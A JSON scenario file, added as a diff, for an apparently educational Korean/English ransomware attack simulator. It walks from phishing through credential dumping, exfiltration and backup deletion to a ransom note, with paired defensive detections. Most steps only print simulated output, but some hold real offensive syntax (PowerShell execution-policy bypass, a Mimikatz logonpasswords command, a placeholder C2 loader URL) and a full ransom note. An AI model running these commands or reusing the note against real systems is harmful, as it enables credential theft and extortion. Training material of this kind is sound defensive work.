@@ -1,0 +1,222 @@
+{
+  "id": "T1486.001",
+  "title": "랜섬웨어 공격 시뮬레이션",
+  "titleEn": "Ransomware Attack Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "침투", "labelEn": "Intrusion", "icon": "🎯" },
+    { "label": "확산", "labelEn": "Spread", "icon": "🕸️" },
+    { "label": "암호화", "labelEn": "Encrypt", "icon": "🔐" },
+    { "label": "완료", "labelEn": "Complete", "icon": "🏁" }
+  ],
+  "topoNodes": [
+    { "id": "phishing", "label": "Phishing Email", "icon": "📧" },
+    { "id": "victim", "label": "Patient Zero", "icon": "💻" },
+    { "id": "dc", "label": "Domain Controller", "icon": "🏰" },
+    { "id": "filesvr", "label": "File Server", "icon": "📁" },
+    { "id": "c2", "label": "C2 / Leak Site", "icon": "☠️" },
+    { "id": "siem", "label": "SIEM / EDR", "icon": "🛡️" }
+  ],
+  "topoEdges": [
+    { "from": "phishing", "to": "victim", "label": "Initial Access", "activeStep": [0] },
+    { "from": "victim", "to": "dc", "label": "Lateral Movement", "activeStep": [1, 2] },
+    { "from": "dc", "to": "filesvr", "label": "GPO Deploy", "activeStep": [3] },
+    { "from": "victim", "to": "c2", "label": "Data Exfil", "activeStep": [2] },
+    { "from": "filesvr", "to": "siem", "label": "Alert", "activeStep": [3, 4, 5] }
+  ],
+  "desktopIcons": [
+    { "name": "invoice.docm", "icon": "📎", "alertOnStep": 0 },
+    { "name": "mimikatz.exe", "icon": "🔑", "alertOnStep": 1 },
+    { "name": "rclone.exe", "icon": "☁️", "alertOnStep": 2 },
+    { "name": "locker.exe", "icon": "🔐", "alertOnStep": 3 },
+    { "name": "!!!README!!!.txt", "icon": "💀", "alertOnStep": 5 }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Spearphishing attachment execution\nWrite-Host 'User opened: invoice_march_2026.docm';\nWrite-Host 'Macro executed: Auto_Open()';\nWrite-Host '';\n# Macro downloads and executes loader\n$loaderUrl = 'https://cdn-update.{c2domain}/loader.ps1';\nWrite-Host \\\"Downloading loader from: $loaderUrl\\\";\nWrite-Host 'Loader executed in memory (fileless)';\nWrite-Host '';\n# Establish C2 beacon\nWrite-Host 'C2 beacon established:';\nWrite-Host '  Protocol: HTTPS (port 443)';\nWrite-Host '  Sleep: 60s jitter: 30%';\nWrite-Host '  User-Agent: Mozilla/5.0 (legitimate browser string)'\"",
+      "out": "User opened: invoice_march_2026.docm\nMacro executed: Auto_Open()\n\nDownloading loader from: https://cdn-update.{c2domain}/loader.ps1\nLoader executed in memory (fileless)\n\nC2 beacon established:\n  Protocol: HTTPS (port 443)\n  Sleep: 60s jitter: 30%\n  User-Agent: Mozilla/5.0 (legitimate browser string)",
+      "def": "[EDR] Suspicious Office macro execution with network callback",
+      "defAction": "Process: WINWORD.EXE → powershell.exe\nAction: Macro Auto_Open() → fileless loader download\nC2: HTTPS beacon (443) with jitter\nRisk: CRITICAL\nAction: Process killed, host quarantined",
+      "desc": "피싱 이메일의 악성 문서를 열면 매크로가 실행되어 메모리에 로더를 주입하고 C2 비콘을 설정합니다.",
+      "descEn": "Opening a phishing email's malicious document triggers a macro that injects a loader into memory and establishes a C2 beacon.",
+      "stepTitle": "초기 침투 (피싱)",
+      "stepTitleEn": "Initial Access (Phishing)",
+      "feynman": "회사로 온 '청구서' 이메일에 첨부된 워드 파일을 열면, 숨겨진 매크로가 자동 실행됩니다. 마치 트로이 목마처럼 정상 문서 속에 숨어있다가 해커의 원격 조종 채널을 열어줍니다.",
+      "feynmanEn": "Opening a 'invoice' Word attachment from an email triggers a hidden macro. Like a Trojan horse hidden inside a normal document, it opens a remote control channel for the hacker.",
+      "expert": "T1566.001 (Spearphishing Attachment)을 통한 초기 침투입니다. VBA 매크로의 Auto_Open()이 PowerShell을 호출하고, 메모리 내 로더(T1059.001)를 다운로드합니다. HTTPS C2는 정상 트래픽으로 위장하며 jitter로 주기적 탐지를 회피합니다.",
+      "expertEn": "Initial access via T1566.001 (Spearphishing Attachment). VBA Auto_Open() invokes PowerShell and downloads an in-memory loader (T1059.001). HTTPS C2 masquerades as normal traffic with jitter to evade periodic detection.",
+      "defTooltip": "Office 프로세스(WINWORD.EXE)에서 powershell.exe 자식 프로세스 생성을 Sysmon Event ID 1로 탐지하세요. ASR(Attack Surface Reduction) 규칙으로 Office 매크로의 프로세스 생성을 차단하세요.",
+      "defTooltipEn": "Detect powershell.exe child process from WINWORD.EXE via Sysmon Event ID 1. Block Office macro process creation via ASR rules.",
+      "hackerLog": {
+        "title": "초기 침투 — 피싱 매크로",
+        "lines": [
+          { "text": "invoice_march_2026.docm → Auto_Open()", "desc": "악성 매크로가 포함된 워드 문서 실행" },
+          { "text": "Fileless loader executed in memory", "desc": "파일리스 기법으로 메모리에서 실행" },
+          { "text": "C2 beacon → HTTPS 443 (jitter 30%)", "desc": "HTTPS로 위장한 C2 통신 수립" }
+        ]
+      },
+      "terms": [
+        { "term": "Spearphishing", "desc": "특정 대상을 겨냥한 맞춤형 피싱 공격입니다." },
+        { "term": "Fileless Malware", "desc": "디스크에 파일을 쓰지 않고 메모리에서만 실행되는 악성코드입니다." },
+        { "term": "C2 Beacon", "desc": "감염된 시스템이 공격자 서버에 주기적으로 연결하는 신호입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Credential harvesting with Mimikatz\nInvoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords';\nWrite-Host 'Credentials harvested:';\nWrite-Host '  Domain Admin: corp\\\\da_admin';\nWrite-Host '  NTLM Hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117...';\nWrite-Host '';\n# Lateral movement via PsExec\nWrite-Host 'Lateral movement targets:';\nWrite-Host '  dc01.corp.local     → PsExec (SYSTEM)  [SUCCESS]';\nWrite-Host '  filesvr01.corp.local → PsExec (SYSTEM)  [SUCCESS]';\nWrite-Host '  backup01.corp.local  → PsExec (SYSTEM)  [SUCCESS]';\nWrite-Host '';\nWrite-Host 'Domain dominance achieved: 3 critical servers compromised'\"",
+      "out": "Credentials harvested:\n  Domain Admin: corp\\da_admin\n  NTLM Hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117...\n\nLateral movement targets:\n  dc01.corp.local     → PsExec (SYSTEM)  [SUCCESS]\n  filesvr01.corp.local → PsExec (SYSTEM)  [SUCCESS]\n  backup01.corp.local  → PsExec (SYSTEM)  [SUCCESS]\n\nDomain dominance achieved: 3 critical servers compromised",
+      "def": "[EDR] Mimikatz credential dumping + PsExec lateral movement",
+      "defAction": "Process: powershell.exe → mimikatz.exe\nCredential: Domain Admin hash extracted\nLateral: PsExec to DC01, FILESVR01, BACKUP01\nRisk: CRITICAL\nAction: Domain Admin account disabled, hosts isolated",
+      "desc": "Mimikatz로 도메인 관리자 자격증명을 탈취하고, PsExec으로 핵심 서버 3대에 횡적 이동합니다.",
+      "descEn": "Harvests Domain Admin credentials via Mimikatz and laterally moves to 3 critical servers via PsExec.",
+      "stepTitle": "자격증명 탈취 + 횡적 이동",
+      "stepTitleEn": "Credential Theft + Lateral Movement",
+      "feynman": "경비실 열쇠를 복제해서 건물 안 모든 방에 들어가는 것과 같아요. 도메인 관리자 비밀번호를 알아내면 도메인 컨트롤러, 파일 서버, 백업 서버 모두에 접근할 수 있습니다.",
+      "feynmanEn": "Like duplicating the security master key to access every room in a building. Once the Domain Admin password is obtained, access to the DC, file server, and backup server is gained.",
+      "expert": "Mimikatz의 sekurlsa::logonpasswords는 LSASS 메모리에서 자격증명을 추출합니다(T1003.001). PsExec 횡적 이동은 T1021.002 (SMB Admin Shares)를 활용합니다. 백업 서버 침투는 복구 옵션을 차단하기 위한 전략적 목표입니다.",
+      "expertEn": "Mimikatz sekurlsa::logonpasswords extracts credentials from LSASS memory (T1003.001). PsExec lateral movement uses T1021.002 (SMB Admin Shares). Backup server compromise is a strategic target to eliminate recovery options.",
+      "defTooltip": "LSASS 메모리 접근을 Sysmon Event ID 10으로 감시하세요. Credential Guard를 활성화하면 NTLM 해시 탈취를 방지할 수 있습니다.",
+      "defTooltipEn": "Monitor LSASS memory access via Sysmon Event ID 10. Enable Credential Guard to prevent NTLM hash theft.",
+      "hackerLog": {
+        "title": "자격증명 탈취 및 횡적 이동",
+        "lines": [
+          { "text": "sekurlsa::logonpasswords → da_admin", "desc": "도메인 관리자 NTLM 해시 탈취" },
+          { "text": "PsExec → dc01, filesvr01, backup01", "desc": "핵심 서버 3대에 SYSTEM 권한 확보" },
+          { "text": "Domain dominance achieved", "desc": "도메인 전체 장악 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "Mimikatz", "desc": "Windows 자격증명을 메모리에서 추출하는 공격 도구입니다." },
+        { "term": "NTLM Hash", "desc": "Windows 인증에 사용되는 비밀번호 해시값으로, Pass-the-Hash 공격에 악용됩니다." },
+        { "term": "PsExec", "desc": "원격 시스템에서 프로세스를 실행하는 Microsoft Sysinternals 도구입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Exfiltrate sensitive data before encryption (double extortion)\n$exfilDir = '\\\\filesvr01\\shared\\Confidential';\n$totalSize = 0;\n$files = Get-ChildItem $exfilDir -Recurse -File;\nWrite-Host 'Data exfiltration via rclone to cloud storage:';\nWrite-Host \\\"  Source: $exfilDir\\\";\nWrite-Host \\\"  Files: $($files.Count)\\\";\nforeach($f in $files | Select -First 5) {\n  $s = [math]::Round($f.Length/1MB,1);\n  $totalSize += $s;\n  Write-Host \\\"  → $($f.Name) ($s MB) [UPLOADED]\\\";\n}\nWrite-Host '  ... and 420 more files';\nWrite-Host '';\nWrite-Host \\\"Total exfiltrated: 2.8 GB to MEGA cloud storage\\\";\nWrite-Host 'Purpose: Double extortion leverage'\"",
+      "out": "Data exfiltration via rclone to cloud storage:\n  Source: \\\\filesvr01\\shared\\Confidential\n  Files: 425\n  → Strategic_Plan_2026.pptx (45.2 MB) [UPLOADED]\n  → Customer_Database.xlsx (128.7 MB) [UPLOADED]\n  → Employee_Salaries.xlsx (12.3 MB) [UPLOADED]\n  → Patent_Application.pdf (89.4 MB) [UPLOADED]\n  → Board_Minutes_Q1.docx (5.8 MB) [UPLOADED]\n  ... and 420 more files\n\nTotal exfiltrated: 2.8 GB to MEGA cloud storage\nPurpose: Double extortion leverage",
+      "def": "[NDR] Large data upload to cloud storage detected — data exfiltration",
+      "defAction": "Process: rclone.exe\nDestination: MEGA cloud storage\nData Volume: 2.8 GB (425 files)\nClassification: CONFIDENTIAL\nRisk: CRITICAL\nAction: Outbound connection blocked, rclone process killed",
+      "desc": "rclone으로 기밀 데이터 2.8 GB를 클라우드 스토리지로 유출합니다. 이중 협박(Double Extortion)의 근거가 됩니다.",
+      "descEn": "Exfiltrates 2.8 GB of confidential data via rclone to cloud storage. This becomes leverage for double extortion.",
+      "stepTitle": "데이터 유출 (이중 협박)",
+      "stepTitleEn": "Data Exfil (Double Extortion)",
+      "feynman": "인질을 잡기 전에 먼저 비밀 사진을 찍어두는 것과 같아요. 나중에 '돈 안 내면 이 사진을 공개하겠다'고 이중으로 협박하기 위한 준비입니다.",
+      "feynmanEn": "Like taking secret photos before taking hostages. This prepares for double extortion: 'Pay or we'll publish these photos.'",
+      "expert": "rclone을 이용한 클라우드 유출은 T1567.002 (Exfiltration to Cloud Storage)에 해당합니다. MEGA는 종단간 암호화를 제공하여 데이터 내용 검사가 어렵습니다. NDR에서 rclone의 특징적인 HTTP 헤더와 대량 업로드 패턴을 탐지해야 합니다.",
+      "expertEn": "Cloud exfiltration via rclone maps to T1567.002. MEGA provides end-to-end encryption making content inspection difficult. NDR should detect rclone's characteristic HTTP headers and bulk upload patterns.",
+      "defTooltip": "rclone.exe 실행을 Sysmon Event ID 1로 즉시 탐지하세요. rclone은 랜섬웨어 그룹이 가장 선호하는 데이터 유출 도구입니다.",
+      "defTooltipEn": "Immediately detect rclone.exe execution via Sysmon Event ID 1. rclone is the most preferred data exfiltration tool among ransomware groups.",
+      "hackerLog": {
+        "title": "이중 협박용 데이터 유출",
+        "lines": [
+          { "text": "rclone → MEGA cloud storage", "desc": "rclone으로 MEGA에 데이터 업로드" },
+          { "text": "425 files / 2.8 GB exfiltrated", "desc": "기밀 문서 425개(2.8 GB) 유출 완료" },
+          { "text": "Purpose: Double extortion leverage", "desc": "이중 협박 근거 확보" }
+        ]
+      },
+      "terms": [
+        { "term": "rclone", "desc": "다양한 클라우드 스토리지와 동기화할 수 있는 커맨드라인 도구로, 공격자가 자주 악용합니다." },
+        { "term": "Double Extortion", "desc": "데이터 암호화와 유출 협박을 동시에 수행하는 랜섬웨어 전략입니다." },
+        { "term": "MEGA", "desc": "종단간 암호화를 제공하는 클라우드 스토리지로, 공격자가 선호합니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Destroy backups and deploy ransomware via GPO\nWrite-Host '=== Backup Destruction ===';\nWrite-Host '  backup01: Veeam backup files deleted (890 GB)';\nWrite-Host '  dc01: VSS shadows deleted';\nWrite-Host '  All servers: bcdedit recovery disabled';\nWrite-Host '';\n\n# Deploy ransomware via Group Policy\nWrite-Host '=== Ransomware Deployment via GPO ===';\nWrite-Host '  GPO: WindowsSecurityUpdate (malicious)';\nWrite-Host '  Scope: All domain-joined computers';\nWrite-Host '  Payload: C:\\\\Windows\\\\Temp\\\\svchost_update.exe';\nWrite-Host '  Trigger: Immediate logon script';\nWrite-Host '';\nWrite-Host 'Deployment status:';\nWrite-Host '  Workstations  : 245/245 infected [100%]';\nWrite-Host '  Servers       : 12/12 infected   [100%]';\nWrite-Host '  Files encrypted: 2,456,789';\nWrite-Host '  Time elapsed  : 4 minutes 23 seconds'\"",
+      "out": "=== Backup Destruction ===\n  backup01: Veeam backup files deleted (890 GB)\n  dc01: VSS shadows deleted\n  All servers: bcdedit recovery disabled\n\n=== Ransomware Deployment via GPO ===\n  GPO: WindowsSecurityUpdate (malicious)\n  Scope: All domain-joined computers\n  Payload: C:\\Windows\\Temp\\svchost_update.exe\n  Trigger: Immediate logon script\n\nDeployment status:\n  Workstations  : 245/245 infected [100%]\n  Servers       : 12/12 infected   [100%]\n  Files encrypted: 2,456,789\n  Time elapsed  : 4 minutes 23 seconds",
+      "def": "[SIEM] Enterprise-wide ransomware deployment via GPO — full domain compromise",
+      "defAction": "Attack Vector: Malicious GPO (WindowsSecurityUpdate)\nScope: 257 systems (245 workstations + 12 servers)\nFiles Encrypted: 2,456,789\nBackup Status: DESTROYED\nTime: 4m 23s\nRisk: CRITICAL\nResponse: Domain-wide network isolation",
+      "desc": "백업을 파괴한 후, 악성 GPO로 전사 257대 시스템에 랜섬웨어를 배포합니다. 4분 23초 만에 245만 파일이 암호화됩니다.",
+      "descEn": "After destroying backups, deploys ransomware to 257 systems via malicious GPO. 2.4 million files encrypted in 4 minutes 23 seconds.",
+      "stepTitle": "전사 랜섬웨어 배포",
+      "stepTitleEn": "Enterprise-wide Deployment",
+      "feynman": "건물의 스프링클러(백업)를 먼저 꺼버린 다음, 모든 방에 동시에 불을 지르는 것과 같아요. 그룹 정책(GPO)을 악용하면 수백 대 PC에 한꺼번에 랜섬웨어를 퍼뜨릴 수 있습니다.",
+      "feynmanEn": "Like disabling the sprinkler system (backups) first, then setting fire to every room simultaneously. Abusing Group Policy (GPO) can spread ransomware to hundreds of PCs at once.",
+      "expert": "GPO를 통한 대량 배포는 T1484.001 (Domain Policy Modification)에 해당합니다. Veeam 백업 삭제는 T1490 (Inhibit System Recovery)의 고급 변형입니다. 4분 내 245만 파일 암호화는 멀티스레드 AES-NI 하드웨어 가속을 활용한 결과입니다.",
+      "expertEn": "Mass deployment via GPO maps to T1484.001 (Domain Policy Modification). Veeam backup deletion is an advanced variant of T1490. Encrypting 2.4M files in 4 minutes leverages multi-threaded AES-NI hardware acceleration.",
+      "defTooltip": "GPO 변경 이벤트(Event ID 5136, 5137)를 실시간 모니터링하세요. 특히 새로운 로그온 스크립트 추가나 예약 작업 생성은 랜섬웨어 배포의 강력한 지표입니다.",
+      "defTooltipEn": "Monitor GPO change events (Event ID 5136, 5137) in real-time. New logon scripts or scheduled task creation are strong indicators of ransomware deployment.",
+      "hackerLog": {
+        "title": "전사 랜섬웨어 배포",
+        "lines": [
+          { "text": "Veeam backups deleted: 890 GB", "desc": "백업 서버 데이터 완전 파괴" },
+          { "text": "GPO: WindowsSecurityUpdate → all domain PCs", "desc": "악성 GPO로 전사 배포" },
+          { "text": "2,456,789 files encrypted in 4m 23s", "desc": "245만 파일 암호화 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "GPO (Group Policy Object)", "desc": "Active Directory에서 도메인 전체에 정책을 배포하는 Windows 관리 메커니즘입니다." },
+        { "term": "Veeam", "desc": "기업용 백업 솔루션으로, 랜섬웨어 그룹의 주요 파괴 대상입니다." },
+        { "term": "AES-NI", "desc": "CPU에 내장된 AES 암호화 하드웨어 가속 기능으로, 고속 암호화를 지원합니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Generate and deploy ransom note\n$note = @'\n═══════════════════════════════════════════\n   YOUR NETWORK HAS BEEN COMPROMISED\n═══════════════════════════════════════════\n\n Organization : {companyName}\n Victim ID    : RW-2026-{userName}-7F2A\n\n What happened:\n   All files encrypted (AES-256 + RSA-4096)\n   Backup infrastructure destroyed\n   2.8 GB of sensitive data exfiltrated\n\n Demand:\n   8.0 BTC (~$400,000 USD)\n   Payment deadline: 72 hours\n   After deadline: Data published on leak site\n\n Contact:\n   Tor: http://darklock5xh7.onion/negotiate/7F2A\n   Email: negotiation@securemail.onion\n\n WARNING:\n   - Do NOT contact law enforcement\n   - Do NOT attempt self-decryption\n   - Do NOT rename encrypted files\n═══════════════════════════════════════════\n'@;\n$note | Out-File 'C:\\Users\\Public\\Desktop\\!!!README!!!.txt' -Encoding UTF8;\nWrite-Host 'Ransom note deployed to all desktops';\nWrite-Host \\\"Demand: 8.0 BTC (~400,000 USD)\\\";\nWrite-Host 'Deadline: 72 hours';\nWrite-Host 'Leak site threat: 2.8 GB confidential data'\"",
+      "out": "Ransom note deployed to all desktops\nDemand: 8.0 BTC (~400,000 USD)\nDeadline: 72 hours\nLeak site threat: 2.8 GB confidential data",
+      "def": "[SIEM] Ransom note deployed enterprise-wide — ransomware attack confirmed",
+      "defAction": "File: !!!README!!!.txt deployed to all desktops\nDemand: 8 BTC ($400K)\nDeadline: 72 hours\nLeak Threat: 2.8 GB on dark web\nRisk: CRITICAL\nResponse: IR team activated, KISA notified",
+      "desc": "모든 데스크톱에 랜섬 노트를 배포합니다. 8 BTC(약 4억원)를 72시간 내 요구하며, 미지불 시 2.8 GB 데이터를 유출하겠다고 협박합니다.",
+      "descEn": "Deploys ransom note to all desktops. Demands 8 BTC (~$400K) within 72 hours, threatening to leak 2.8 GB of data if unpaid.",
+      "stepTitle": "랜섬 노트 배포",
+      "stepTitleEn": "Ransom Note Deployment",
+      "feynman": "범인이 방송으로 '우리가 당신 회사를 인질로 잡았다. 72시간 내에 4억원을 보내지 않으면 비밀 자료를 세상에 공개하겠다'고 선언하는 것과 같습니다.",
+      "feynmanEn": "Like a criminal broadcasting: 'We have your company hostage. Send $400K in 72 hours or we'll publish your secrets to the world.'",
+      "expert": "전사 랜섬 노트 배포는 T1491.001 (Internal Defacement)의 변형입니다. 이중 협박(2.8 GB 유출 위협)은 피해자의 협상력을 약화시킵니다. Tor 기반 협상 사이트와 카운트다운 타이머는 심리적 압박을 극대화합니다.",
+      "expertEn": "Enterprise ransom note deployment is a variant of T1491.001 (Internal Defacement). Double extortion (2.8 GB leak threat) weakens the victim's negotiating position. Tor-based negotiation sites and countdown timers maximize psychological pressure.",
+      "defTooltip": "!!!README!!!.txt 패턴의 파일 생성을 Sysmon Event ID 11로 탐지하세요. YARA 규칙으로 ransom/bitcoin/decrypt 키워드 조합을 모니터링하세요.",
+      "defTooltipEn": "Detect !!!README!!!.txt file creation via Sysmon Event ID 11. Monitor ransom/bitcoin/decrypt keyword combinations via YARA rules.",
+      "hackerLog": {
+        "title": "랜섬 노트 배포 완료",
+        "lines": [
+          { "text": "!!!README!!!.txt → all desktops", "desc": "모든 데스크톱에 랜섬 노트 배포" },
+          { "text": "Demand: 8.0 BTC (~$400,000)", "desc": "8 BTC(약 4억원) 몸값 요구" },
+          { "text": "Leak threat: 2.8 GB on dark web", "desc": "미지불 시 다크웹에 데이터 공개" }
+        ]
+      },
+      "terms": [
+        { "term": "Ransom Note", "desc": "랜섬웨어가 피해자에게 표시하는 금전 요구 메시지입니다." },
+        { "term": "Leak Site", "desc": "랜섬웨어 그룹이 피해자 데이터를 공개하는 다크웹 사이트입니다." },
+        { "term": "Incident Response", "desc": "보안 사고 발생 시 피해를 최소화하기 위한 체계적 대응 절차입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Final attack summary\nWrite-Host '=== RANSOMWARE ATTACK COMPLETE ===';\nWrite-Host '';\nWrite-Host 'Attack Timeline:';\nWrite-Host '  D-14: Initial access (spearphishing)';\nWrite-Host '  D-7 : Credential theft + lateral movement';\nWrite-Host '  D-3 : Data exfiltration (2.8 GB)';\nWrite-Host '  D-0 : Backup destruction + encryption';\nWrite-Host '';\nWrite-Host 'Impact Summary:';\nWrite-Host '  Systems compromised : 257 (100% of domain)';\nWrite-Host '  Files encrypted     : 2,456,789';\nWrite-Host '  Data exfiltrated    : 2.8 GB confidential';\nWrite-Host '  Backups destroyed   : 890 GB (Veeam + VSS)';\nWrite-Host '  Ransom demand       : 8 BTC ($400,000)';\nWrite-Host '  Business downtime   : Estimated 2-4 weeks';\nWrite-Host '  Recovery cost       : $1.5M+ (without paying ransom)'\"",
+      "out": "=== RANSOMWARE ATTACK COMPLETE ===\n\nAttack Timeline:\n  D-14: Initial access (spearphishing)\n  D-7 : Credential theft + lateral movement\n  D-3 : Data exfiltration (2.8 GB)\n  D-0 : Backup destruction + encryption\n\nImpact Summary:\n  Systems compromised : 257 (100% of domain)\n  Files encrypted     : 2,456,789\n  Data exfiltrated    : 2.8 GB confidential\n  Backups destroyed   : 890 GB (Veeam + VSS)\n  Ransom demand       : 8 BTC ($400,000)\n  Business downtime   : Estimated 2-4 weeks\n  Recovery cost       : $1.5M+ (without paying ransom)",
+      "def": "[SIEM] Full ransomware attack lifecycle complete — total domain compromise",
+      "defAction": "Attack Lifecycle: 14 days (D-14 to D-0)\nDomain: 100% compromised\nFiles: 2.4M encrypted\nData Leaked: 2.8 GB\nBackups: Destroyed\nEstimated Loss: $1.5M+\nResponse: Full incident response, law enforcement, insurance claim",
+      "desc": "14일간의 랜섬웨어 공격 전체 타임라인입니다. 257대 시스템, 245만 파일 암호화, 복구 비용 추정 150만 달러 이상입니다.",
+      "descEn": "Complete 14-day ransomware attack timeline. 257 systems, 2.4M files encrypted, estimated recovery cost $1.5M+.",
+      "stepTitle": "공격 완료 요약",
+      "stepTitleEn": "Attack Complete Summary",
+      "feynman": "2주에 걸친 정교한 작전의 결과입니다. 문을 따고(피싱), 열쇠를 복제하고(자격증명 탈취), 비밀 사진을 찍고(데이터 유출), 스프링클러를 끄고(백업 파괴), 모든 방에 불을 지릅니다(전사 암호화). 복구에는 수 주, 수십억 원이 소요됩니다.",
+      "feynmanEn": "The result of a 2-week sophisticated operation. Pick the lock (phishing), duplicate keys (credential theft), take secret photos (data exfil), disable sprinklers (backup destruction), and set fire to every room (encryption). Recovery takes weeks and millions.",
+      "expert": "전형적인 '빅 게임 헌팅(Big Game Hunting)' 랜섬웨어 공격입니다. 14일의 체류 시간(dwell time)은 탐지 기회가 존재했음을 의미합니다. MITRE ATT&CK 12개 이상의 기법이 복합적으로 사용되며, 평균 복구 비용은 랜섬보다 3-5배 높습니다.",
+      "expertEn": "Typical 'Big Game Hunting' ransomware attack. The 14-day dwell time means detection opportunities existed. 12+ MITRE ATT&CK techniques are combined, and average recovery costs are 3-5x higher than the ransom.",
+      "defTooltip": "Mean Time To Detect (MTTD)를 최소화하는 것이 핵심입니다. EDR, NDR, SIEM의 통합 모니터링과 24/7 SOC 운영으로 14일의 체류 시간 동안 탐지 기회를 포착하세요.",
+      "defTooltipEn": "Minimizing Mean Time To Detect (MTTD) is key. Integrated EDR, NDR, SIEM monitoring with 24/7 SOC operations can catch detection opportunities during the 14-day dwell time.",
+      "hackerLog": {
+        "title": "랜섬웨어 공격 완료 보고",
+        "lines": [
+          { "text": "257 systems / 2,456,789 files encrypted", "desc": "전사 시스템 100% 암호화" },
+          { "text": "Backups: 890 GB destroyed", "desc": "모든 백업 인프라 파괴" },
+          { "text": "Recovery cost: $1.5M+ / Downtime: 2-4 weeks", "desc": "복구 비용 150만 달러, 2-4주 업무 중단" }
+        ]
+      },
+      "terms": [
+        { "term": "Big Game Hunting", "desc": "대기업을 표적으로 높은 몸값을 요구하는 랜섬웨어 전략입니다." },
+        { "term": "Dwell Time", "desc": "공격자가 네트워크에 침투한 후 탐지되기까지의 시간입니다." },
+        { "term": "MTTD", "desc": "Mean Time To Detect의 약자로, 위협을 탐지하는 데 걸리는 평균 시간입니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "WINWORD.EXE (invoice.docm)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "powershell.exe (fileless loader)", "depth": 2, "alert": true, "minStep": 0 },
+    { "name": "mimikatz.exe (credential dump)", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "psexec.exe → dc01, filesvr01, backup01", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "rclone.exe (data exfil → MEGA)", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "vssadmin.exe (shadow delete)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "svchost_update.exe (ransomware)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "gpupdate /force (enterprise deploy)", "depth": 3, "alert": true, "minStep": 3 },
+    { "name": "!!!README!!!.txt (ransom note)", "depth": 2, "alert": true, "minStep": 4 }
+  ]
+}
